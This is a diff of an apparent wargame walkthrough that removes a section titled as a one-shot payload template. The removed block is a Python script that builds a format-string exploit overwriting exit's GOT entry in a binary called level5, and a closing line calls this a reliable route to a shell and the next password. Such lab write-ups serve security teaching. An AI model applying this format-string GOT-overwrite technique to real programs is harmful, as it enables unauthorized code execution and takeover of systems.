@@ -165,23 +165,4 @@ d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 ---
 
-## 9) One-shot payload template (adapt as needed)
-
-```bash
-python - <<'PY' > /tmp/explo
-import sys
-# Addresses for THIS binary/environment:
-exit_got = 0x08049838
-o_addr   = 0x080484a4          # target value to write
-# Adjust padding if needed after testing
-padding  = 134513824           # tuned so total printed bytes == o_addr
-sys.stdout.write(exit_got.to_bytes(4,'little'))
-sys.stdout.write("%%%dd" % padding)
-sys.stdout.write("%%4$n")
-PY
-
-./level5 < /tmp/explo
-```
-
 That’s it. Clean, reliable GOT overwrite → shell → grab the next password.
-
